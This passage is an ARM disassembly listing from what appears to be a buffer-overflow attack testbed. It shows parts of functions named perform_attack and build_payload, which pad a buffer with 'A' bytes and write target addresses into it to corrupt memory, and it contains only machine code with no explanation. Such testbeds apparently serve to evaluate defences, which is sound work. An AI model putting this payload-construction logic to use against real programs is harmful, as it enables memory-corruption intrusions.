    a994:	0000aa81 	.word	0x0000aa81
    a998:	0000aa91 	.word	0x0000aa91
    a99c:	0000aacb 	.word	0x0000aacb
    a9a0:	0000aad9 	.word	0x0000aad9
    a9a4:	0000aaf5 	.word	0x0000aaf5
    a9a8:	0000ab15 	.word	0x0000ab15
    a9ac:	0000abdd 	.word	0x0000abdd
    a9b0:	f507 3351 	add.w	r3, r7, #214016	; 0x34400
    a9b4:	f503 7341 	add.w	r3, r3, #772	; 0x304
    a9b8:	681b      	ldr	r3, [r3, #0]
    a9ba:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    a9be:	f2c0 0000 	movt	r0, #0
    a9c2:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    a9c6:	4798      	blx	r3
    a9c8:	e12e      	b.n	ac28 <perform_attack+0x1bd4>
    a9ca:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a9ce:	3bb8      	subs	r3, #184	; 0xb8
    a9d0:	681b      	ldr	r3, [r3, #0]
    a9d2:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    a9d6:	f2c0 0000 	movt	r0, #0
    a9da:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    a9de:	4798      	blx	r3
    a9e0:	e122      	b.n	ac28 <perform_attack+0x1bd4>
    a9e2:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    a9e6:	f102 02b8 	add.w	r2, r2, #184	; 0xb8
    a9ea:	6813      	ldr	r3, [r2, #0]
    a9ec:	681b      	ldr	r3, [r3, #0]
    a9ee:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    a9f2:	f2c0 0000 	movt	r0, #0
    a9f6:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    a9fa:	4798      	blx	r3
    a9fc:	e114      	b.n	ac28 <perform_attack+0x1bd4>
    a9fe:	f646 3324 	movw	r3, #27428	; 0x6b24
    aa02:	f2c0 0301 	movt	r3, #1
    aa06:	681b      	ldr	r3, [r3, #0]
    aa08:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    aa0c:	f2c0 0000 	movt	r0, #0
    aa10:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    aa14:	4798      	blx	r3
    aa16:	e107      	b.n	ac28 <perform_attack+0x1bd4>
    aa18:	f246 7348 	movw	r3, #26440	; 0x6748
    aa1c:	f2c0 0301 	movt	r3, #1
    aa20:	4618      	mov	r0, r3
    aa22:	f001 f80f 	bl	ba44 <contains_terminating_char>
    aa26:	4603      	mov	r3, r0
    aa28:	2b00      	cmp	r3, #0
    aa2a:	d00c      	beq.n	aa46 <perform_attack+0x19f2>
    aa2c:	f246 7344 	movw	r3, #26436	; 0x6744
    aa30:	f2c0 0301 	movt	r3, #1
    aa34:	681b      	ldr	r3, [r3, #0]
    aa36:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    aa3a:	f2c0 0000 	movt	r0, #0
    aa3e:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    aa42:	4798      	blx	r3
    aa44:	e0f0      	b.n	ac28 <perform_attack+0x1bd4>
    aa46:	f246 7348 	movw	r3, #26440	; 0x6748
    aa4a:	f2c0 0301 	movt	r3, #1
    aa4e:	681b      	ldr	r3, [r3, #0]
    aa50:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    aa54:	f2c0 0000 	movt	r0, #0
    aa58:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    aa5c:	4798      	blx	r3
    aa5e:	e0e3      	b.n	ac28 <perform_attack+0x1bd4>
    aa60:	f507 3351 	add.w	r3, r7, #214016	; 0x34400
    aa64:	f503 7342 	add.w	r3, r3, #776	; 0x308
    aa68:	4618      	mov	r0, r3
    aa6a:	2101      	movs	r1, #1
    aa6c:	f7fd ef3a 	blx	88e4 <_init+0x50>
    aa70:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    aa74:	3bbc      	subs	r3, #188	; 0xbc
    aa76:	681b      	ldr	r3, [r3, #0]
    aa78:	4618      	mov	r0, r3
    aa7a:	2101      	movs	r1, #1
    aa7c:	f7fd ef32 	blx	88e4 <_init+0x50>
    aa80:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    aa84:	f103 03b4 	add.w	r3, r3, #180	; 0xb4
    aa88:	6818      	ldr	r0, [r3, #0]
    aa8a:	2101      	movs	r1, #1
    aa8c:	f7fd ef2a 	blx	88e4 <_init+0x50>
    aa90:	f646 2388 	movw	r3, #27272	; 0x6a88
    aa94:	f2c0 0301 	movt	r3, #1
    aa98:	681b      	ldr	r3, [r3, #0]
    aa9a:	2b64      	cmp	r3, #100	; 0x64
    aa9c:	d106      	bne.n	aaac <perform_attack+0x1a58>
    aa9e:	f646 40b0 	movw	r0, #27824	; 0x6cb0
    aaa2:	f2c0 0001 	movt	r0, #1
    aaa6:	2101      	movs	r1, #1
    aaa8:	f7fd ef1c 	blx	88e4 <_init+0x50>
    aaac:	f646 2388 	movw	r3, #27272	; 0x6a88
    aab0:	f2c0 0301 	movt	r3, #1
    aab4:	681b      	ldr	r3, [r3, #0]
    aab6:	2b65      	cmp	r3, #101	; 0x65
    aab8:	d106      	bne.n	aac8 <perform_attack+0x1a74>
    aaba:	f646 6040 	movw	r0, #28224	; 0x6e40
    aabe:	f2c0 0001 	movt	r0, #1
    aac2:	2101      	movs	r1, #1
    aac4:	f7fd ef0e 	blx	88e4 <_init+0x50>
    aac8:	e0ae      	b.n	ac28 <perform_attack+0x1bd4>
    aaca:	f646 0078 	movw	r0, #26744	; 0x6878
    aace:	f2c0 0001 	movt	r0, #1
    aad2:	2101      	movs	r1, #1
    aad4:	f7fd ef06 	blx	88e4 <_init+0x50>
    aad8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    aadc:	f5a3 7331 	sub.w	r3, r3, #708	; 0x2c4
    aae0:	f8d3 3100 	ldr.w	r3, [r3, #256]	; 0x100
    aae4:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    aae8:	f2c0 0000 	movt	r0, #0
    aaec:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    aaf0:	4798      	blx	r3
    aaf2:	e099      	b.n	ac28 <perform_attack+0x1bd4>
    aaf4:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    aaf8:	f10c 0c9c 	add.w	ip, ip, #156	; 0x9c
    aafc:	f8dc 3000 	ldr.w	r3, [ip]
    ab00:	f8d3 3100 	ldr.w	r3, [r3, #256]	; 0x100
    ab04:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    ab08:	f2c0 0000 	movt	r0, #0
    ab0c:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    ab10:	4798      	blx	r3
    ab12:	e089      	b.n	ac28 <perform_attack+0x1bd4>
    ab14:	f646 0360 	movw	r3, #26720	; 0x6860
    ab18:	f2c0 0301 	movt	r3, #1
    ab1c:	681a      	ldr	r2, [r3, #0]
    ab1e:	f246 734c 	movw	r3, #26444	; 0x674c
    ab22:	f2c0 0301 	movt	r3, #1
    ab26:	f8d3 3100 	ldr.w	r3, [r3, #256]	; 0x100
    ab2a:	4610      	mov	r0, r2
    ab2c:	f24d 113c 	movw	r1, #53564	; 0xd13c
    ab30:	f2c0 0100 	movt	r1, #0
    ab34:	f246 724c 	movw	r2, #26444	; 0x674c
    ab38:	f2c0 0201 	movt	r2, #1
    ab3c:	f7fd ef4a 	blx	89d4 <_init+0x140>
    ab40:	2300      	movs	r3, #0
    ab42:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    ab46:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    ab4a:	6003      	str	r3, [r0, #0]
    ab4c:	e028      	b.n	aba0 <perform_attack+0x1b4c>
    ab4e:	f646 0360 	movw	r3, #26720	; 0x6860
    ab52:	f2c0 0301 	movt	r3, #1
    ab56:	681a      	ldr	r2, [r3, #0]
    ab58:	f246 734c 	movw	r3, #26444	; 0x674c
    ab5c:	f2c0 0301 	movt	r3, #1
    ab60:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    ab64:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    ab68:	f8dc 1000 	ldr.w	r1, [ip]
    ab6c:	440b      	add	r3, r1
    ab6e:	781b      	ldrb	r3, [r3, #0]
    ab70:	4610      	mov	r0, r2
    ab72:	f64c 6174 	movw	r1, #52852	; 0xce74
    ab76:	f2c0 0100 	movt	r1, #0
    ab7a:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    ab7e:	f10c 0cac 	add.w	ip, ip, #172	; 0xac
    ab82:	f8dc 2000 	ldr.w	r2, [ip]
    ab86:	f7fd ef26 	blx	89d4 <_init+0x140>
    ab8a:	f507 3052 	add.w	r0, r7, #215040	; 0x34800
    ab8e:	f100 00ac 	add.w	r0, r0, #172	; 0xac
    ab92:	6803      	ldr	r3, [r0, #0]
    ab94:	3301      	adds	r3, #1
    ab96:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    ab9a:	f101 01ac 	add.w	r1, r1, #172	; 0xac
    ab9e:	600b      	str	r3, [r1, #0]
    aba0:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    aba4:	f102 02ac 	add.w	r2, r2, #172	; 0xac
    aba8:	6813      	ldr	r3, [r2, #0]
    abaa:	2bff      	cmp	r3, #255	; 0xff
    abac:	ddcf      	ble.n	ab4e <perform_attack+0x1afa>
    abae:	f646 0360 	movw	r3, #26720	; 0x6860
    abb2:	f2c0 0301 	movt	r3, #1
    abb6:	681b      	ldr	r3, [r3, #0]
    abb8:	200a      	movs	r0, #10
    abba:	4619      	mov	r1, r3
    abbc:	f7fd ef40 	blx	8a40 <_init+0x1ac>
    abc0:	f246 734c 	movw	r3, #26444	; 0x674c
    abc4:	f2c0 0301 	movt	r3, #1
    abc8:	f8d3 3100 	ldr.w	r3, [r3, #256]	; 0x100
    abcc:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    abd0:	f2c0 0000 	movt	r0, #0
    abd4:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    abd8:	4798      	blx	r3
    abda:	e025      	b.n	ac28 <perform_attack+0x1bd4>
    abdc:	f646 3328 	movw	r3, #27432	; 0x6b28
    abe0:	f2c0 0301 	movt	r3, #1
    abe4:	f8d3 3100 	ldr.w	r3, [r3, #256]	; 0x100
    abe8:	f64c 10bc 	movw	r0, #51644	; 0xc9bc
    abec:	f2c0 0000 	movt	r0, #0
    abf0:	f44f 712f 	mov.w	r1, #700	; 0x2bc
    abf4:	4798      	blx	r3
    abf6:	e017      	b.n	ac28 <perform_attack+0x1bd4>
    abf8:	f646 0350 	movw	r3, #26704	; 0x6850
    abfc:	f2c0 0301 	movt	r3, #1
    ac00:	681b      	ldr	r3, [r3, #0]
    ac02:	2b00      	cmp	r3, #0
    ac04:	d00c      	beq.n	ac20 <perform_attack+0x1bcc>
    ac06:	f646 0360 	movw	r3, #26720	; 0x6860
    ac0a:	f2c0 0301 	movt	r3, #1
    ac0e:	681b      	ldr	r3, [r3, #0]
    ac10:	f64c 3094 	movw	r0, #52116	; 0xcb94
    ac14:	f2c0 0000 	movt	r0, #0
    ac18:	2101      	movs	r1, #1
    ac1a:	2226      	movs	r2, #38	; 0x26
    ac1c:	f7fd ee92 	blx	8944 <_init+0xb0>
    ac20:	2001      	movs	r0, #1
    ac22:	f7fd eec6 	blx	89b0 <_init+0x11c>
    ac26:	bf00      	nop
    ac28:	f646 2380 	movw	r3, #27264	; 0x6a80
    ac2c:	f2c0 0301 	movt	r3, #1
    ac30:	681b      	ldr	r3, [r3, #0]
    ac32:	2b00      	cmp	r3, #0
    ac34:	d04a      	beq.n	accc <perform_attack+0x1c78>
    ac36:	f507 5386 	add.w	r3, r7, #4288	; 0x10c0
    ac3a:	3b04      	subs	r3, #4
    ac3c:	4618      	mov	r0, r3
    ac3e:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    ac42:	f103 03b0 	add.w	r3, r3, #176	; 0xb0
    ac46:	6819      	ldr	r1, [r3, #0]
    ac48:	22c0      	movs	r2, #192	; 0xc0
    ac4a:	f001 f823 	bl	bc94 <save_memory>
    ac4e:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    ac52:	3bb4      	subs	r3, #180	; 0xb4
    ac54:	681a      	ldr	r2, [r3, #0]
    ac56:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    ac5a:	3bb4      	subs	r3, #180	; 0xb4
    ac5c:	f24d 104c 	movw	r0, #53580	; 0xd14c
    ac60:	f2c0 0000 	movt	r0, #0
    ac64:	4611      	mov	r1, r2
    ac66:	461a      	mov	r2, r3
    ac68:	f7fd ee2a 	blx	88c0 <_init+0x2c>
    ac6c:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    ac70:	3bb4      	subs	r3, #180	; 0xb4
    ac72:	6818      	ldr	r0, [r3, #0]
    ac74:	f507 5113 	add.w	r1, r7, #9408	; 0x24c0
    ac78:	f5a1 7161 	sub.w	r1, r1, #900	; 0x384
    ac7c:	f507 5286 	add.w	r2, r7, #4288	; 0x10c0
    ac80:	3a04      	subs	r2, #4
    ac82:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    ac86:	3b84      	subs	r3, #132	; 0x84
    ac88:	24c0      	movs	r4, #192	; 0xc0
    ac8a:	9400      	str	r4, [sp, #0]
    ac8c:	f001 f8d2 	bl	be34 <print_three_memory_dumps>
    ac90:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    ac94:	3bb4      	subs	r3, #180	; 0xb4
    ac96:	681b      	ldr	r3, [r3, #0]
    ac98:	4618      	mov	r0, r3
    ac9a:	f7fd ee2a 	blx	88f0 <_init+0x5c>
    ac9e:	f646 0350 	movw	r3, #26704	; 0x6850
    aca2:	f2c0 0301 	movt	r3, #1
    aca6:	681b      	ldr	r3, [r3, #0]
    aca8:	2b00      	cmp	r3, #0
    acaa:	d00c      	beq.n	acc6 <perform_attack+0x1c72>
    acac:	f646 0360 	movw	r3, #26720	; 0x6860
    acb0:	f2c0 0301 	movt	r3, #1
    acb4:	681b      	ldr	r3, [r3, #0]
    acb6:	f24d 1078 	movw	r0, #53624	; 0xd178
    acba:	f2c0 0000 	movt	r0, #0
    acbe:	2101      	movs	r1, #1
    acc0:	2218      	movs	r2, #24
    acc2:	f7fd ee40 	blx	8944 <_init+0xb0>
    acc6:	2001      	movs	r0, #1
    acc8:	f7fd ee2a 	blx	8920 <_init+0x8c>
    accc:	f507 3752 	add.w	r7, r7, #215040	; 0x34800
    acd0:	37c4      	adds	r7, #196	; 0xc4
    acd2:	46bd      	mov	sp, r7
    acd4:	bdf0      	pop	{r4, r5, r6, r7, pc}
    acd6:	bf00      	nop

0000acd8 <build_payload>:
    acd8:	b580      	push	{r7, lr}
    acda:	b08a      	sub	sp, #40	; 0x28
    acdc:	af00      	add	r7, sp, #0
    acde:	6078      	str	r0, [r7, #4]
    ace0:	f646 2388 	movw	r3, #27272	; 0x6a88
    ace4:	f2c0 0301 	movt	r3, #1
    ace8:	685b      	ldr	r3, [r3, #4]
    acea:	3bc8      	subs	r3, #200	; 0xc8
    acec:	2b05      	cmp	r3, #5
    acee:	f200 808b 	bhi.w	ae08 <build_payload+0x130>
    acf2:	a201      	add	r2, pc, #4	; (adr r2, acf8 <build_payload+0x20>)
    acf4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
    acf8:	0000ad11 	.word	0x0000ad11
    acfc:	0000ad41 	.word	0x0000ad41
    ad00:	0000ad7d 	.word	0x0000ad7d
    ad04:	0000addd 	.word	0x0000addd
    ad08:	0000adad 	.word	0x0000adad
    ad0c:	0000adf9 	.word	0x0000adf9
    ad10:	687b      	ldr	r3, [r7, #4]
    ad12:	685a      	ldr	r2, [r3, #4]
    ad14:	f246 1388 	movw	r3, #24968	; 0x6188
    ad18:	f2c0 0301 	movt	r3, #1
    ad1c:	681b      	ldr	r3, [r3, #0]
    ad1e:	3304      	adds	r3, #4
    ad20:	429a      	cmp	r2, r3
    ad22:	d201      	bcs.n	ad28 <build_payload+0x50>
    ad24:	2300      	movs	r3, #0
    ad26:	e31b      	b.n	b360 <build_payload+0x688>
    ad28:	f246 1388 	movw	r3, #24968	; 0x6188
    ad2c:	f2c0 0301 	movt	r3, #1
    ad30:	681b      	ldr	r3, [r3, #0]
    ad32:	627b      	str	r3, [r7, #36]	; 0x24
    ad34:	f246 1358 	movw	r3, #24920	; 0x6158
    ad38:	f2c0 0301 	movt	r3, #1
    ad3c:	623b      	str	r3, [r7, #32]
    ad3e:	e07a      	b.n	ae36 <build_payload+0x15e>
    ad40:	687b      	ldr	r3, [r7, #4]
    ad42:	685a      	ldr	r2, [r3, #4]
    ad44:	f246 13dc 	movw	r3, #25052	; 0x61dc
    ad48:	f2c0 0301 	movt	r3, #1
    ad4c:	681b      	ldr	r3, [r3, #0]
    ad4e:	3304      	adds	r3, #4
    ad50:	429a      	cmp	r2, r3
    ad52:	d207      	bcs.n	ad64 <build_payload+0x8c>
    ad54:	f24d 1094 	movw	r0, #53652	; 0xd194
    ad58:	f2c0 0000 	movt	r0, #0
    ad5c:	f7fd ee0a 	blx	8974 <_init+0xe0>
    ad60:	2300      	movs	r3, #0
    ad62:	e2fd      	b.n	b360 <build_payload+0x688>
    ad64:	f246 13dc 	movw	r3, #25052	; 0x61dc
    ad68:	f2c0 0301 	movt	r3, #1
    ad6c:	681b      	ldr	r3, [r3, #0]
    ad6e:	627b      	str	r3, [r7, #36]	; 0x24
    ad70:	f246 138c 	movw	r3, #24972	; 0x618c
    ad74:	f2c0 0301 	movt	r3, #1
    ad78:	623b      	str	r3, [r7, #32]
    ad7a:	e05c      	b.n	ae36 <build_payload+0x15e>
    ad7c:	687b      	ldr	r3, [r7, #4]
    ad7e:	685a      	ldr	r2, [r3, #4]
    ad80:	f246 2330 	movw	r3, #25136	; 0x6230
    ad84:	f2c0 0301 	movt	r3, #1
    ad88:	681b      	ldr	r3, [r3, #0]
    ad8a:	3304      	adds	r3, #4
    ad8c:	429a      	cmp	r2, r3
    ad8e:	d201      	bcs.n	ad94 <build_payload+0xbc>
    ad90:	2300      	movs	r3, #0
    ad92:	e2e5      	b.n	b360 <build_payload+0x688>
    ad94:	f246 2330 	movw	r3, #25136	; 0x6230
    ad98:	f2c0 0301 	movt	r3, #1
    ad9c:	681b      	ldr	r3, [r3, #0]
    ad9e:	627b      	str	r3, [r7, #36]	; 0x24
    ada0:	f246 13e0 	movw	r3, #25056	; 0x61e0
    ada4:	f2c0 0301 	movt	r3, #1
    ada8:	623b      	str	r3, [r7, #32]
    adaa:	e044      	b.n	ae36 <build_payload+0x15e>
    adac:	687b      	ldr	r3, [r7, #4]
    adae:	685a      	ldr	r2, [r3, #4]
    adb0:	f246 2368 	movw	r3, #25192	; 0x6268
    adb4:	f2c0 0301 	movt	r3, #1
    adb8:	681b      	ldr	r3, [r3, #0]
    adba:	3304      	adds	r3, #4
    adbc:	429a      	cmp	r2, r3
    adbe:	d201      	bcs.n	adc4 <build_payload+0xec>
    adc0:	2300      	movs	r3, #0
    adc2:	e2cd      	b.n	b360 <build_payload+0x688>
    adc4:	f246 2368 	movw	r3, #25192	; 0x6268
    adc8:	f2c0 0301 	movt	r3, #1
    adcc:	681b      	ldr	r3, [r3, #0]
    adce:	627b      	str	r3, [r7, #36]	; 0x24
    add0:	f246 2334 	movw	r3, #25140	; 0x6234
    add4:	f2c0 0301 	movt	r3, #1
    add8:	623b      	str	r3, [r7, #32]
    adda:	e02c      	b.n	ae36 <build_payload+0x15e>
    addc:	687b      	ldr	r3, [r7, #4]
    adde:	685b      	ldr	r3, [r3, #4]
    ade0:	2b03      	cmp	r3, #3
    ade2:	d801      	bhi.n	ade8 <build_payload+0x110>
    ade4:	2300      	movs	r3, #0
    ade6:	e2bb      	b.n	b360 <build_payload+0x688>
    ade8:	2300      	movs	r3, #0
    adea:	627b      	str	r3, [r7, #36]	; 0x24
    adec:	f24d 13c8 	movw	r3, #53704	; 0xd1c8
    adf0:	f2c0 0300 	movt	r3, #0
    adf4:	623b      	str	r3, [r7, #32]
    adf6:	e01e      	b.n	ae36 <build_payload+0x15e>
    adf8:	2300      	movs	r3, #0
    adfa:	627b      	str	r3, [r7, #36]	; 0x24
    adfc:	f24d 13c8 	movw	r3, #53704	; 0xd1c8
    ae00:	f2c0 0300 	movt	r3, #0
    ae04:	623b      	str	r3, [r7, #32]
    ae06:	e016      	b.n	ae36 <build_payload+0x15e>
    ae08:	f646 0350 	movw	r3, #26704	; 0x6850
    ae0c:	f2c0 0301 	movt	r3, #1
    ae10:	681b      	ldr	r3, [r3, #0]
    ae12:	2b00      	cmp	r3, #0
    ae14:	d00c      	beq.n	ae30 <build_payload+0x158>
    ae16:	f646 0360 	movw	r3, #26720	; 0x6860
    ae1a:	f2c0 0301 	movt	r3, #1
    ae1e:	681b      	ldr	r3, [r3, #0]
    ae20:	f24d 10d0 	movw	r0, #53712	; 0xd1d0
    ae24:	f2c0 0000 	movt	r0, #0
    ae28:	2101      	movs	r1, #1
    ae2a:	2229      	movs	r2, #41	; 0x29
    ae2c:	f7fd ed8a 	blx	8944 <_init+0xb0>
    ae30:	2001      	movs	r0, #1
    ae32:	f7fd edbe 	blx	89b0 <_init+0x11c>
    ae36:	687b      	ldr	r3, [r7, #4]
    ae38:	685b      	ldr	r3, [r3, #4]
    ae3a:	4618      	mov	r0, r3
    ae3c:	f7fd eda0 	blx	8980 <_init+0xec>
    ae40:	4603      	mov	r3, r0
    ae42:	461a      	mov	r2, r3
    ae44:	687b      	ldr	r3, [r7, #4]
    ae46:	60da      	str	r2, [r3, #12]
    ae48:	687b      	ldr	r3, [r7, #4]
    ae4a:	68db      	ldr	r3, [r3, #12]
    ae4c:	2b00      	cmp	r3, #0
    ae4e:	d107      	bne.n	ae60 <build_payload+0x188>
    ae50:	f24d 10fc 	movw	r0, #53756	; 0xd1fc
    ae54:	f2c0 0000 	movt	r0, #0
    ae58:	f7fd ed6e 	blx	8938 <_init+0xa4>
    ae5c:	2300      	movs	r3, #0
    ae5e:	e27f      	b.n	b360 <build_payload+0x688>
    ae60:	687b      	ldr	r3, [r7, #4]
    ae62:	68db      	ldr	r3, [r3, #12]
    ae64:	4618      	mov	r0, r3
    ae66:	6a39      	ldr	r1, [r7, #32]
    ae68:	6a7a      	ldr	r2, [r7, #36]	; 0x24
    ae6a:	f7fd ed54 	blx	8914 <_init+0x80>
    ae6e:	687b      	ldr	r3, [r7, #4]
    ae70:	685a      	ldr	r2, [r3, #4]
    ae72:	6a7b      	ldr	r3, [r7, #36]	; 0x24
    ae74:	1ad3      	subs	r3, r2, r3
    ae76:	3b05      	subs	r3, #5
    ae78:	61fb      	str	r3, [r7, #28]
    ae7a:	687b      	ldr	r3, [r7, #4]
    ae7c:	68da      	ldr	r2, [r3, #12]
    ae7e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
    ae80:	4413      	add	r3, r2
    ae82:	4618      	mov	r0, r3
    ae84:	2141      	movs	r1, #65	; 0x41
    ae86:	69fa      	ldr	r2, [r7, #28]
    ae88:	f7fd edbc 	blx	8a04 <_init+0x170>
    ae8c:	f646 0360 	movw	r3, #26720	; 0x6860
    ae90:	f2c0 0301 	movt	r3, #1
    ae94:	681a      	ldr	r2, [r3, #0]
    ae96:	687b      	ldr	r3, [r7, #4]
    ae98:	689b      	ldr	r3, [r3, #8]
    ae9a:	4610      	mov	r0, r2
    ae9c:	f24d 2120 	movw	r1, #53792	; 0xd220
    aea0:	f2c0 0100 	movt	r1, #0
    aea4:	461a      	mov	r2, r3
    aea6:	f7fd ed96 	blx	89d4 <_init+0x140>
    aeaa:	f646 2388 	movw	r3, #27272	; 0x6a88
    aeae:	f2c0 0301 	movt	r3, #1
    aeb2:	681b      	ldr	r3, [r3, #0]
    aeb4:	2b64      	cmp	r3, #100	; 0x64
    aeb6:	d17b      	bne.n	afb0 <build_payload+0x2d8>
    aeb8:	f646 2388 	movw	r3, #27272	; 0x6a88
    aebc:	f2c0 0301 	movt	r3, #1
    aec0:	689a      	ldr	r2, [r3, #8]
    aec2:	f240 1333 	movw	r3, #307	; 0x133
    aec6:	429a      	cmp	r2, r3
    aec8:	d021      	beq.n	af0e <build_payload+0x236>
    aeca:	f646 2388 	movw	r3, #27272	; 0x6a88
    aece:	f2c0 0301 	movt	r3, #1
    aed2:	689b      	ldr	r3, [r3, #8]
    aed4:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    aed8:	d019      	beq.n	af0e <build_payload+0x236>
    aeda:	f646 2388 	movw	r3, #27272	; 0x6a88
    aede:	f2c0 0301 	movt	r3, #1
    aee2:	689a      	ldr	r2, [r3, #8]
    aee4:	f240 1335 	movw	r3, #309	; 0x135
    aee8:	429a      	cmp	r2, r3
    aeea:	d010      	beq.n	af0e <build_payload+0x236>
    aeec:	f646 2388 	movw	r3, #27272	; 0x6a88
    aef0:	f2c0 0301 	movt	r3, #1
    aef4:	689b      	ldr	r3, [r3, #8]
    aef6:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    aefa:	d008      	beq.n	af0e <build_payload+0x236>
    aefc:	f646 2388 	movw	r3, #27272	; 0x6a88
    af00:	f2c0 0301 	movt	r3, #1
    af04:	689a      	ldr	r2, [r3, #8]
    af06:	f240 1337 	movw	r3, #311	; 0x137
    af0a:	429a      	cmp	r2, r3
    af0c:	d150      	bne.n	afb0 <build_payload+0x2d8>
    af0e:	687b      	ldr	r3, [r7, #4]
    af10:	68da      	ldr	r2, [r3, #12]
    af12:	6a79      	ldr	r1, [r7, #36]	; 0x24
    af14:	69fb      	ldr	r3, [r7, #28]
    af16:	440b      	add	r3, r1
    af18:	3b14      	subs	r3, #20
    af1a:	441a      	add	r2, r3
    af1c:	687b      	ldr	r3, [r7, #4]
    af1e:	691b      	ldr	r3, [r3, #16]
    af20:	4610      	mov	r0, r2
    af22:	4619      	mov	r1, r3
    af24:	2214      	movs	r2, #20
    af26:	f7fd ecf6 	blx	8914 <_init+0x80>
    af2a:	f646 2388 	movw	r3, #27272	; 0x6a88
    af2e:	f2c0 0301 	movt	r3, #1
    af32:	689b      	ldr	r3, [r3, #8]
    af34:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    af38:	d116      	bne.n	af68 <build_payload+0x290>
    af3a:	687b      	ldr	r3, [r7, #4]
    af3c:	691b      	ldr	r3, [r3, #16]
    af3e:	461a      	mov	r2, r3
    af40:	687b      	ldr	r3, [r7, #4]
    af42:	695b      	ldr	r3, [r3, #20]
    af44:	1ad3      	subs	r3, r2, r3
    af46:	61bb      	str	r3, [r7, #24]
    af48:	687b      	ldr	r3, [r7, #4]
    af4a:	68da      	ldr	r2, [r3, #12]
    af4c:	6a79      	ldr	r1, [r7, #36]	; 0x24
    af4e:	69fb      	ldr	r3, [r7, #28]
    af50:	4419      	add	r1, r3
    af52:	69bb      	ldr	r3, [r7, #24]
    af54:	1acb      	subs	r3, r1, r3
    af56:	3b14      	subs	r3, #20
    af58:	441a      	add	r2, r3
    af5a:	687b      	ldr	r3, [r7, #4]
    af5c:	695b      	ldr	r3, [r3, #20]
    af5e:	4610      	mov	r0, r2
    af60:	4619      	mov	r1, r3
    af62:	2204      	movs	r2, #4
    af64:	f7fd ecd6 	blx	8914 <_init+0x80>
    af68:	f646 2388 	movw	r3, #27272	; 0x6a88
    af6c:	f2c0 0301 	movt	r3, #1
    af70:	685b      	ldr	r3, [r3, #4]
    af72:	2bcb      	cmp	r3, #203	; 0xcb
    af74:	d11c      	bne.n	afb0 <build_payload+0x2d8>
    af76:	4bb3      	ldr	r3, [pc, #716]	; (b244 <build_payload+0x56c>)
    af78:	60fb      	str	r3, [r7, #12]
    af7a:	687b      	ldr	r3, [r7, #4]
    af7c:	68da      	ldr	r2, [r3, #12]
    af7e:	6a79      	ldr	r1, [r7, #36]	; 0x24
    af80:	69fb      	ldr	r3, [r7, #28]
    af82:	440b      	add	r3, r1
    af84:	3b04      	subs	r3, #4
    af86:	441a      	add	r2, r3
    af88:	f107 030c 	add.w	r3, r7, #12
    af8c:	4610      	mov	r0, r2
    af8e:	4619      	mov	r1, r3
    af90:	2204      	movs	r2, #4
    af92:	f7fd ecc0 	blx	8914 <_init+0x80>
    af96:	f646 0360 	movw	r3, #26720	; 0x6860
    af9a:	f2c0 0301 	movt	r3, #1
    af9e:	681b      	ldr	r3, [r3, #0]
    afa0:	f24d 2034 	movw	r0, #53812	; 0xd234
    afa4:	f2c0 0000 	movt	r0, #0
    afa8:	2101      	movs	r1, #1
    afaa:	2220      	movs	r2, #32
    afac:	f7fd ecca 	blx	8944 <_init+0xb0>
    afb0:	f646 2388 	movw	r3, #27272	; 0x6a88
    afb4:	f2c0 0301 	movt	r3, #1
    afb8:	689a      	ldr	r2, [r3, #8]
    afba:	f240 132d 	movw	r3, #301	; 0x12d
    afbe:	429a      	cmp	r2, r3
    afc0:	f040 80e1 	bne.w	b186 <build_payload+0x4ae>
    afc4:	687b      	ldr	r3, [r7, #4]
    afc6:	2220      	movs	r2, #32
    afc8:	61da      	str	r2, [r3, #28]
    afca:	f646 2388 	movw	r3, #27272	; 0x6a88
    afce:	f2c0 0301 	movt	r3, #1
    afd2:	681b      	ldr	r3, [r3, #0]
    afd4:	2b64      	cmp	r3, #100	; 0x64
    afd6:	d161      	bne.n	b09c <build_payload+0x3c4>
    afd8:	687b      	ldr	r3, [r7, #4]
    afda:	68da      	ldr	r2, [r3, #12]
    afdc:	6a79      	ldr	r1, [r7, #36]	; 0x24
    afde:	69fb      	ldr	r3, [r7, #28]
    afe0:	4419      	add	r1, r3
    afe2:	687b      	ldr	r3, [r7, #4]
    afe4:	69db      	ldr	r3, [r3, #28]
    afe6:	1acb      	subs	r3, r1, r3
    afe8:	441a      	add	r2, r3
